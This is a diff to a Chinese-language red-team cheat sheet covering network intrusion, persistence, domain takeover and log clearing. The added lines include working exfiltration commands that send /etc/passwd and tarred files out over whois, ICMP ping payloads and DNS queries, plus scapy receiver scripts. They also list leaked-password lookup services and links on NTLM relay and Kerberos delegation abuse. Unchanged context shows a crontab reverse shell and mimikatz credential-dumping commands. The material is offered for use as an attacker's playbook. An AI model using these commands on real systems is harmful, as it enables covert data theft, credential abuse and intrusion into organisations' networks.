@@ -1,6 +1,6 @@
  Author: [Evi1cg](https://twitter.com/Evi1cg) 
  Blog: https://evi1cg.github.io
-  
+
 
 Table of Contents
 =================
@@ -13,6 +13,7 @@ Table of Contents
   * [创建企业密码字典](#%E5%88%9B%E5%BB%BA%E4%BC%81%E4%B8%9A%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8)
     * [字典列表](#%E5%AD%97%E5%85%B8%E5%88%97%E8%A1%A8)
     * [邮箱列表获取](#%E9%82%AE%E7%AE%B1%E5%88%97%E8%A1%A8%E8%8E%B7%E5%8F%96)
+    * [泄露密码查询](#%E6%B3%84%E9%9C%B2%E5%AF%86%E7%A0%81%E6%9F%A5%E8%AF%A2)
     * [对企业外部相关信息进行搜集](#%E5%AF%B9%E4%BC%81%E4%B8%9A%E5%A4%96%E9%83%A8%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E8%BF%9B%E8%A1%8C%E6%90%9C%E9%9B%86)
       * [子域名获取](#%E5%AD%90%E5%9F%9F%E5%90%8D%E8%8E%B7%E5%8F%96)
 * [进入内网](#%E8%BF%9B%E5%85%A5%E5%86%85%E7%BD%91)
@@ -22,16 +23,17 @@ Table of Contents
   * [无线Wi\-Fi接入](#%E6%97%A0%E7%BA%BFwi-fi%E6%8E%A5%E5%85%A5)
 * [隐匿攻击](#%E9%9A%90%E5%8C%BF%E6%94%BB%E5%87%BB)
   * [Command and Control](#command-and-control)
-  * [Froting](#froting)
+  * [Fronting](#fronting)
   * [代理](#%E4%BB%A3%E7%90%86)
 * [内网跨边界应用](#%E5%86%85%E7%BD%91%E8%B7%A8%E8%BE%B9%E7%95%8C%E5%BA%94%E7%94%A8)
   * [内网跨边界转发](#%E5%86%85%E7%BD%91%E8%B7%A8%E8%BE%B9%E7%95%8C%E8%BD%AC%E5%8F%91)
   * [内网跨边界代理穿透](#%E5%86%85%E7%BD%91%E8%B7%A8%E8%BE%B9%E7%95%8C%E4%BB%A3%E7%90%86%E7%A9%BF%E9%80%8F)
-    * [<a href="http://rootkiter\.com/EarthWorm/" rel="nofollow">EW</a>](#ew)
-    * [<a href="http://rootkiter\.com/Termite/" rel="nofollow">Termite</a>](#termite)
+    * [EW](#ew)
+    * [Termite](#termite)
     * [代理脚本](#%E4%BB%A3%E7%90%86%E8%84%9A%E6%9C%AC)
   * [shell反弹](#shell%E5%8F%8D%E5%BC%B9)
   * [内网文件的传输和下载](#%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E7%9A%84%E4%BC%A0%E8%BE%93%E5%92%8C%E4%B8%8B%E8%BD%BD)
+  * [搭建 HTTP server](#%E6%90%AD%E5%BB%BA%20HTTP%20server)
 * [内网信息搜集](#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86)
   * [本机信息搜集](#%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86)
     * [1、用户列表](#1%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8)
@@ -76,35 +78,35 @@ Table of Contents
       * [8、Browser Helper Objects](#8browser-helper-objects)
       * [9、AppInit\_DLLs](#9appinit_dlls)
       * [10、文件关联](#10%E6%96%87%E4%BB%B6%E5%85%B3%E8%81%94)
-      * [11、<a href="http://www\.liuhaihua\.cn/archives/357579\.html" rel="nofollow">bitsadmin</a>](#11bitsadmin)
-      * [12、<a href="https://evi1cg\.me/archives/Powershell\_MOF\_Backdoor\.html" rel="nofollow">mof </a>](#12mof-)
-      * [13、<a href="https://3gstudent\.github\.io/3gstudent\.github\.io/Study\-Notes\-of\-WMI\-Persistence\-using\-wmic\.exe/" rel="nofollow">wmi</a>](#13wmi)
-      * [14、<a href="https://3gstudent\.github\.io/3gstudent\.github\.io/Userland\-registry\-hijacking/" rel="nofollow">Userland Persistence With Scheduled Tasks</a>](#14userland-persistence-with-scheduled-tasks)
-      * [15、<a href="https://3gstudent\.github\.io/3gstudent\.github\.io/Netsh\-persistence/" rel="nofollow">Netsh</a>](#15netsh)
-      * [16、<a href="https://3gstudent\.github\.io/3gstudent\.github\.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application\-Compatibility\-Shims/" rel="nofollow">Shim</a>](#16shim)
-      * [17、<a href="https://3gstudent\.github\.io/3gstudent\.github\.io/DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7Rattler%E6%B5%8B%E8%AF%95/" rel="nofollow">DLL劫持</a>](#17dll%E5%8A%AB%E6%8C%81)
-      * [18、<a href="https://3gstudent\.github\.io/3gstudent\.github\.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application\-Verifier(DoubleAgent%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D)/" rel="nofollow">DoubleAgent </a>](#18doubleagent-)
-      * [19、<a href="https://3gstudent\.github\.io/3gstudent\.github\.io/Use\-Waitfor\.exe\-to\-maintain\-persistence/" rel="nofollow">waitfor\.exe </a>](#19waitforexe-)
-      * [20、<a href="https://3gstudent\.github\.io/3gstudent\.github\.io/Use\-AppDomainManager\-to\-maintain\-persistence/" rel="nofollow">AppDomainManager</a>](#20appdomainmanager)
+      * [11、bitsadmin](#11bitsadmin)
+      * [12、mof ](#12mof-)
+      * [13、wmi](#13wmi)
+      * [14、Userland Persistence With Scheduled Tasks](#14userland-persistence-with-scheduled-tasks)
+      * [15、Netsh](#15netsh)
+      * [16、Shim](#16shim)
+      * [17、DLL劫持](#17dll%E5%8A%AB%E6%8C%81)
+      * [18、DoubleAgent ](#18doubleagent-)
+      * [19、waitfor\.exe ](#19waitforexe-)
+      * [20、AppDomainManager](#20appdomainmanager)
       * [21、Office](#21office)
-      * [22、<a href="https://3gstudent\.github\.io/3gstudent\.github\.io/Use\-CLR\-to\-maintain\-persistence/" rel="nofollow">CLR</a>](#22clr)
-      * [23、<a href="https://3gstudent\.github\.io/3gstudent\.github\.io/Use\-msdtc\-to\-maintain\-persistence/" rel="nofollow">msdtc</a>](#23msdtc)
-      * [24、<a href="https://3gstudent\.github\.io/3gstudent\.github\.io/Use\-COM\-Object\-hijacking\-to\-maintain\-persistence\-Hijack\-CAccPropServicesClass\-and\-MMDeviceEnumerator/" rel="nofollow">Hijack CAccPropServicesClass and MMDeviceEnumerato</a>](#24hijack-caccpropservicesclass-and-mmdeviceenumerato)
-      * [25、<a href="https://3gstudent\.github\.io/3gstudent\.github\.io/Use\-COM\-Object\-hijacking\-to\-maintain\-persistence\-Hijack\-explorer\.exe/" rel="nofollow">Hijack explorer\.exe</a>](#25hijack-explorerexe)
+      * [22、CLR](#22clr)
+      * [23、msdtc](#23msdtc)
+      * [24、Hijack CAccPropServicesClass and MMDeviceEnumerato](#24hijack-caccpropservicesclass-and-mmdeviceenumerato)
+      * [25、Hijack explorer\.exe](#25hijack-explorerexe)
       * [26、Windows FAX DLL Injection](#26windows-fax-dll-injection)
       * [27、特殊注册表键值](#27%E7%89%B9%E6%AE%8A%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%94%AE%E5%80%BC)
       * [28、快捷方式后门](#28%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E5%90%8E%E9%97%A8)
-      * [29、<a href="https://3gstudent\.github\.io/3gstudent\.github\.io/Use\-Logon\-Scripts\-to\-maintain\-persistence/" rel="nofollow">Logon Scripts</a>](#29logon-scripts)
-      * [30、<a href="https://3gstudent\.github\.io/3gstudent\.github\.io/Password\-Filter\-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/" rel="nofollow">Password Filter DLL</a>](#30password-filter-dll)
-      * [31、<a href="https://3gstudent\.github\.io/3gstudent\.github\.io/%E5%88%A9%E7%94%A8BHO%E5%AE%9E%E7%8E%B0IE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81/" rel="nofollow">利用BHO实现IE浏览器劫持</a>](#31%E5%88%A9%E7%94%A8bho%E5%AE%9E%E7%8E%B0ie%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81)
+      * [29、Logon Scripts](#29logon-scripts)
+      * [30、Password Filter DLL](#30password-filter-dll)
+      * [31、利用BHO实现IE浏览器劫持](#31%E5%88%A9%E7%94%A8bho%E5%AE%9E%E7%8E%B0ie%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81)
     * [Linux](#linux-2)
       * [crontab](#crontab)
       * [硬链接sshd](#%E7%A1%AC%E9%93%BE%E6%8E%A5sshd)
       * [SSH Server wrapper](#ssh-server-wrapper)
       * [SSH keylogger](#ssh-keylogger)
       * [Cymothoa\_进程注入backdoor](#cymothoa_%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5backdoor)
-      * [rookit](#rookit)
-      * [Tools：](#tools)
+      * [rootkit](#rootkit)
+      * [Tools](#tools)
   * [WEB后门](#web%E5%90%8E%E9%97%A8)
 * [横向渗透](#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F)
   * [端口渗透](#%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F)
@@ -119,6 +121,9 @@ Table of Contents
       * [4、常用端口类(扫描弱口令/端口爆破)](#4%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E7%B1%BB%E6%89%AB%E6%8F%8F%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%AB%AF%E5%8F%A3%E7%88%86%E7%A0%B4)
       * [5、端口合计所对应的服务](#5%E7%AB%AF%E5%8F%A3%E5%90%88%E8%AE%A1%E6%89%80%E5%AF%B9%E5%BA%94%E7%9A%84%E6%9C%8D%E5%8A%A1)
     * [信息搜集](#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-1)
+      * [powerview.ps1](#powerview.ps1)
+      * [BloodHound](#BloodHound)
+      * [获取域内DNS信息](#%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85DNS%E4%BF%A1%E6%81%AF)
     * [获取域控的方法](#%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%96%B9%E6%B3%95)
       * [SYSVOL](#sysvol)
       * [MS14\-068 Kerberos](#ms14-068-kerberos)
@@ -127,15 +132,20 @@ Table of Contents
       * [Kerberos的银票务](#kerberos%E7%9A%84%E9%93%B6%E7%A5%A8%E5%8A%A1)
       * [域服务账号破解](#%E5%9F%9F%E6%9C%8D%E5%8A%A1%E8%B4%A6%E5%8F%B7%E7%A0%B4%E8%A7%A3)
       * [凭证盗窃](#%E5%87%AD%E8%AF%81%E7%9B%97%E7%AA%83)
+      * [NTLM relay](#NTLM%20relay)
+      * [Kerberos委派](#Kerberos%E5%A7%94%E6%B4%BE)
       * [地址解析协议](#%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AE)
     * [获取AD哈希](#%E8%8E%B7%E5%8F%96ad%E5%93%88%E5%B8%8C)
     * [AD持久化](#ad%E6%8C%81%E4%B9%85%E5%8C%96)
       * [活动目录持久性技巧](#%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E6%8C%81%E4%B9%85%E6%80%A7%E6%8A%80%E5%B7%A7)
       * [Security Support Provider](#security-support-provider)
-      * [<a href="https://adsecurity\.org/?p=1772" rel="nofollow">SID History</a>](#sid-history)
-      * [<a href="https://adsecurity\.org/?p=1906" rel="nofollow">AdminSDHolder＆SDProp </a>](#adminsdholdersdprop-)
+      * [SID History](#sid-history)
+      * [AdminSDHolder＆SDProp](#adminsdholdersdprop-)
       * [组策略](#%E7%BB%84%E7%AD%96%E7%95%A5)
       * [Hook PasswordChangeNotify](#hook-passwordchangenotify)
+      * [Kerberoasting后门](#Kerberoasting%E5%90%8E%E9%97%A8)
+      * [AdminSDHolder](#AdminSDHolder)
+      * [Delegation](#Delegation)
     * [TIPS](#tips)
     * [相关工具](#%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7)
   * [在远程系统上执行程序](#%E5%9C%A8%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E4%B8%8A%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F)
@@ -145,7 +155,7 @@ Table of Contents
     * [Bypass Applocker](#bypass-applocker)
     * [bypassAV](#bypassav)
 * [痕迹清理](#%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86)
-  * [<a href="https://3gstudent\.github\.io/3gstudent\.github\.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7\-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87/" rel="nofollow">Windows日志清除</a>](#windows%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4)
+  * [Windows日志清除](#windows%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4)
   * [破坏Windows日志记录功能](#%E7%A0%B4%E5%9D%8Fwindows%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E5%8A%9F%E8%83%BD)
   * [msf](#msf)
   * [3389登陆记录清除](#3389%E7%99%BB%E9%99%86%E8%AE%B0%E5%BD%95%E6%B8%85%E9%99%A4)
@@ -171,7 +181,7 @@ Table of Contents
     * 自搭建:https://github.com/hanc00l/wooyun_publi/
 
 #### google hacking 
- 
+
 ### 创建企业密码字典 
 #### 字典列表 
 * passwordlist:https://github.com/lavalamp-/password-lists
@@ -194,6 +204,10 @@ Table of Contents
 * 获取一个邮箱以后导出通讯录 
 * LinkedInt :https://github.com/mdsecactivebreach/LinkedInt
 * Mailget：https://github.com/Ridter/Mailget
+
+#### 泄露密码查询
+* ghostproject: https://ghostproject.fr/
+* pwndb: https://pwndb2am4tzkvold.onion.to/
 
 #### 对企业外部相关信息进行搜集
 ##### 子域名获取 
@@ -232,6 +246,8 @@ ls xxx.yyy.cn #列出域信息
 * subdomain3 :https://github.com/yanxiu0614/subdomain3
 * FuzzDomain :https://github.com/Chora10/FuzzDomain
 * dnsdumpster.com :https://dnsdumpster.com/
+* phpinfo.me :https://phpinfo.me/domain/
+* dns开放数据接口 :https://dns.bufferover.run/dns?q=baidu.com
 
 ## 进入内网 
 
@@ -280,10 +296,10 @@ ls xxx.yyy.cn #列出域信息
 * JavaScript :https://pentestlab.blog/2018/01/08/command-and-control-javascript/
 *  ... 
 
-### Froting 
+### Fronting 
 * [Domain Fronting ](https://evi1cg.me/archives/Domain_Fronting.html)
 * [Tor_Fronting.](https://evi1cg.me/archives/Tor_Fronting.html)
-    
+  
 ### 代理 
 * VPN 
 * shadowsockts :https://github.com/shadowsocks
@@ -295,13 +311,14 @@ ls xxx.yyy.cn #列出域信息
 ### 内网跨边界转发 
 * [NC端口转发](https://blog.csdn.net/l_f0rm4t3d/article/details/24004555) 
 * [LCX端口转发 ](http://blog.chinaunix.net/uid-53401-id-4407931.html)
+* [nps](https://github.com/cnlh/nps)
 * 代理脚本 
     1. [Tunna ](https://github.com/SECFORCE/Tunna)
     2. [Reduh ](https://github.com/sensepost/reDuh)
 * ... 
-    
+  
 ### 内网跨边界代理穿透 
-#### [EW](http://rootkiter.com/EarthWorm/) 
+#### [EW](https://rootkiter.com/EarthWorm/) 
 正向 SOCKS v5 服务器:
 ```
 ./ew -s ssocksd -l 1080
@@ -321,7 +338,7 @@ $ ./ew -s rssocks -d 1.1.1.1 -e 8888
 $ ./ew -s lcx_listen -l 1080 -e 8888
 $ ./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999
 $ ./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999
-``` 
+```
 lcx_tran 的用法
 ```
 $ ./ew -s ssocksd -l 9999
@@ -340,8 +357,8 @@ $ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
 $ ./ew -s lcx_listen -l 9999 -e 7777
 $ ./ew -s rssocks -d 127.0.0.1 -e 7777
 ```
-#### [Termite](http://rootkiter.com/Termite/) 
-使用说明:http://rootkiter.com/Termite/README.txt 
+#### [Termite](https://rootkiter.com/Termite/) 
+使用说明:https://rootkiter.com/Termite/README.txt 
 #### 代理脚本 
 reGeorg :https://github.com/sensepost/reGeorg
 
@@ -507,7 +524,7 @@ rsync
 远程rsync服务器中拷贝文件到本地机 
 ```
 rsync -av root@192.168.78.192::www /databack
-```   
+```
 本地机器拷贝文件到远程rsync服务器 
 ```
 rsync -av /databack root@192.168.78.192::www
@@ -516,7 +533,122 @@ certutil.exe
 ```
 certutil.exe -urlcache -split -f http://site.com/file
 ```
+copy
+```
+copy \\IP\ShareName\file.exe file.exe
+```
+WHOIS
+接收端 Host B：
+```
+nc -vlnp 1337 | sed "s/ //g" | base64 -d 
+```
+发送端 Host A：
+```
+whois -h host_ip -p 1337 `cat /etc/passwd | base64`
+```
+
+[WHOIS + TAR](https://twitter.com/mubix/status/1102780436118409216)
+First:  
+```
+ncat -k -l -p 4444 | tee files.b64  #tee to a file so you can make sure you have it
+```
+
+Next
+```
+tar czf - /tmp/* | base64 | xargs -I bits timeout 0.03 whois -h host_ip -p 4444 bits
+```
+
+Finally
+```
+cat files.b64 | tr -d '\r\n' | base64 -d | tar zxv #to get the files out
+```
+
+PING
+发送端:
+```
+xxd -p -c 4 secret.txt | while read line; do ping -c 1 -p $line ip; done
+```
+接收端`ping_receiver.py`:
+```
+import sys
+
+try:
+    from scapy.all import *
+except:
+    print("Scapy not found, please install scapy: pip install scapy")
+    sys.exit(0)
+
+
+def process_packet(pkt):
+    if pkt.haslayer(ICMP):
+        if pkt[ICMP].type == 8:
+            data = pkt[ICMP].load[-4:]
+            print(f'{data.decode("utf-8")}', flush=True, end="", sep="")
+
+sniff(iface="eth0", prn=process_packet)
+```
+```
+python3 ping_receiver.py
+```
+
+DIG
+发送端:
+```
+xxd -p -c 31 /etc/passwd | while read line; do dig @172.16.1.100 +short +tries=1 +time=1 $line.gooogle.com; done
+```
+接收端`dns_reciver.py`:
+```
+try:
+    from scapy.all import *
+except:
+    print("Scapy not found, please install scapy: pip install scapy")
+
+def process_packet(pkt):
+    if pkt.haslayer(DNS):
+        domain = pkt[DNS][DNSQR].qname.decode('utf-8')
+        root_domain = domain.split('.')[1]
+        if root_domain.startswith('gooogle'):
+            print(f'{bytearray.fromhex(domain[:-13]).decode("utf-8")}', flush=True, end='')
+
+sniff(iface="eth0", prn=process_packet)
+```
+```
+python3 dns_reciver.py
+```
 ... 
+### 搭建 HTTP server
+python2
+```
+python -m SimpleHTTPServer 1337
+```
+python3
+```
+python -m http.server 1337
+```
+PHP 5.4+
+```
+php -S 0.0.0.0:1337
+```
+ruby
+```
+ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 1337, :DocumentRoot => Dir.pwd).start'
+```
+```
+ruby -run -e httpd . -p 1337
+```
+Perl
+```
+perl -MHTTP::Server::Brick -e '$s=HTTP::Server::Brick->new(port=>1337); $s->mount("/"=>{path=>"."}); $s->start'
+```
+```
+perl -MIO::All -e 'io(":8080")->fork->accept->(sub { $_[0] < io(-x $1 +? "./$1 |" : $1) if /^GET \/(.*) / })'
+```
+busybox httpd
+```
+busybox httpd -f -p 8000
+```
+
+
 
 ## 内网信息搜集 
 
@@ -563,7 +695,7 @@ ftp等
 * [nirsoft_package](http://launcher.nirsoft.net/downloads/)
 * [QuarksPwDump](https://github.com/quarkslab/quarkspwdump) [fgdump](https://github.com/mcandre/fgdump)
 * 星号查看器等
-    
+  
 ##### Linux
 * [LaZagne](https://github.com/AlessandroZ/LaZagne)  
 * [mimipenguin](https://github.com/huntergregal/mimipenguin)
@@ -646,8 +778,8 @@ dsquery server && net time /domain------>列出该域内域控制器
 
 #### 提权 
 * windows内核漏洞提权
->检测类:[Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester),[WinSystemHelper](https://github.com/brianwrf/WinSystemHelper)
->利用类:[windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
+>检测类:[Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester),[WinSystemHelper](https://github.com/brianwrf/WinSystemHelper),[wesng](https://github.com/bitsadmin/wesng)
+>利用类:[windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)，[BeRoot](https://github.com/AlessandroZ/BeRoot.git)
 
 * 服务提权 
 >数据库服务，ftp服务等
@@ -956,7 +1088,7 @@ New-ItemProperty "HKCU:\Environment\" UserInitMprLogonScript -value "c:\test\11.
 ```
 ##### 30、[Password Filter DLL](https://3gstudent.github.io/3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/) 
 ##### 31、[利用BHO实现IE浏览器劫持](https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BHO%E5%AE%9E%E7%8E%B0IE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81/) 
-        
+
 #### Linux 
 ##### crontab 
 每60分钟反弹一次shell给dns.wuyun.org的53端口
@@ -999,14 +1131,19 @@ source .bashrc
 ```
 nc -vv ip 7777
 ```
-##### rookit 
-[openssh_rookit](http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz)
+##### rootkit
+
+[openssh_rootkit](http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz)
 [Kbeast_rootkit ](http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz)
-Mafix + Suterusu rookit
-##### Tools： 
+Mafix + Suterusu rootkit
+
+##### Tools
+
 [Vegile ](https://github.com/Screetsec/Vegile)
 [backdoor ](https://github.com/icco/backdoor)
-### WEB后门 
+
+### WEB后门
+
 PHP Meterpreter后门 
 Aspx Meterpreter后门 
 weevely 
@@ -1140,7 +1277,7 @@ webacoo
 ```
 ### 域渗透 
 #### 信息搜集 
-powerview.ps1 
+##### powerview.ps1 
 ```
 Get-NetDomain - gets the name of the current user's domain
 Get-NetForest - gets the forest associated with the current user's domain
@@ -1168,8 +1305,11 @@ Get-NetConnections - gets active connections to a specific server resource (shar
 Get-NetFiles - gets open files on a server
 Get-NetProcesses - gets the remote processes and owners on a remote server
 ```
-BloodHound
-            
+##### BloodHound
+##### 获取域内DNS信息
+* [adidnsdump](https://github.com/dirkjanm/adidnsdump)
+* [域渗透——DNS记录的获取](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DNS%E8%AE%B0%E5%BD%95%E7%9A%84%E8%8E%B7%E5%8F%96/)
+​            
 #### 获取域控的方法 
 ##### SYSVOL 
 SYSVOL是指存储域公共文件服务器副本的共享文件夹，它们在域中所有的域控制器之间复制。 Sysvol文件夹是安装AD时创建的，它用来存放GPO、Script等信息。同时，存放在Sysvol文件夹中的信息，会复制到域中所有DC上。 
@@ -1190,7 +1330,7 @@ net use k: \pentest.comc$
 ```
 相关阅读 :
 * [Kerberos的工具包PyKEK](http://adsecurity.org/?p=676) 
-* [深入解读MS14-068漏洞](http://www.freebuf.com/vuls/56081.html) 
+* [深入解读MS14-068漏洞](http://www.freebuf.com/vuls/56081.html)
 * [Kerberos的安全漏洞](https://adsecurity.org/?p=541) 
 
 ##### SPN扫描 
@@ -1251,9 +1391,24 @@ tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kir
 ```
 ##### 凭证盗窃 
 从搜集的密码里面找管理员的密码 
+
+##### NTLM relay
+ * [One API call away from Domain Admin](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
+ * [privexchange](https://github.com/dirkjanm/privexchange/)
+ * [Exchange2domain](https://github.com/ridter/exchange2domain)
+
+##### Kerberos委派
+ * [Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
+ * [s4u2pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
+ * [Attacking Kerberos Delegation](https://xz.aliyun.com/t/2931)
+ * [用打印服务获取域控](https://adsecurity.org/?p=4056)
+ * [Computer Takeover](https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/)
+ * [Combining NTLM Relaying and Kerberos delegation](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)
+ * [CVE-2019-1040](https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/)
+
 ##### 地址解析协议 
 实在搞不定再搞ARP 
-    
+​    
 #### 获取AD哈希 
 * 使用VSS卷影副本 
 * Ntdsutil中获取NTDS.DIT​​文件 
@@ -1262,7 +1417,7 @@ tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kir
 
 ```
 mimikatz lsadump::lsa /inject exit 
-``` 
+```
 * 使用PowerShell Mimikatz
 * 使用Mimikatz的DCSync 远程转储Active Directory凭证
 提取 KRBTGT用户帐户的密码数据：
@@ -1305,7 +1460,17 @@ mimikatz "privilege::debug" "misc::addsid bobafett ADSAdministrator"
 https://adsecurity.org/?p=2716 
 [策略对象在持久化及横向渗透中的应用](https://www.anquanke.com/post/id/86531) 
 ##### Hook PasswordChangeNotify 
-http://wooyun.jozxing.cc/static/drops/tips-13079.html 
+http://www.vuln.cn/6812
+
+##### Kerberoasting后门
+[域渗透-Kerberoasting](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/)
+
+##### AdminSDHolder
+[Backdooring AdminSDHolder for Persistence](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
+
+##### Delegation
+[Unconstrained Domain Persistence](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#unconstrained-domain-persistence)
+
 #### TIPS 
 [《域渗透——Dump Clear-Text Password after KB2871997 installed》](https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed) 
 [《域渗透——Hook PasswordChangeNotify》](http://www.vuln.cn/6812) 
@@ -1346,7 +1511,7 @@ http://wooyun.jozxing.cc/static/drops/tips-13079.html
 * [Responder](https://github.com/SpiderLabs/Responder) 
 * [MITMf](https://github.com/byt3bl33d3r/MITMf) 
 * [3r/MITMf)](https://github.com/evilsocket/bettercap) 
-    
+  
 ### 规避杀软及检测 
 #### Bypass Applocker 
 [UltimateAppLockerByPassList ](https://github.com/api0cradle/UltimateAppLockerByPassList)
@@ -1412,4 +1577,3 @@ clearev
 @del "%USERPROFILE%\My Documents\Default.rdp" /a
 @exit
 ```
-
